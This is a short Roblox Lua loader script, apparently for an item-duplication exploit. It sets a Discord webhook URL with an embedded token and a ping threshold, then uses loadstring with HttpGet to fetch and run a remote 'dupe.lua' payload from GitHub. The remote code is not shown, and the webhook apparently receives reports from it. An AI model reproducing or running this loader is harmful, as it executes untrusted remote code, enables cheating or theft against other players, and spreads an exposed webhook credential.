local Webhook = "https://discord.com/api/webhooks/1441806711672274985/KR-gkTk1HiaMTlZi_hZpXu4J6CQxgPptTogOooojx5bDZVEAuvN8btk3bnT17HHLMDtF"

getgenv().UserPingThreshold = 50000000


-- =================================================================================
--      SCRIPT LOADER - DO NOT EDIT BELOW THIS LINE
-- =================================================================================

if Webhook and Webhook:match("discord.com/api/webhooks") then
    getgenv().UserWebhookURL = Webhook
else
    return
end

loadstring(game:HttpGet('https://raw.githubusercontent.com/LXZRz/dupe/main/dupe.lua', true))()
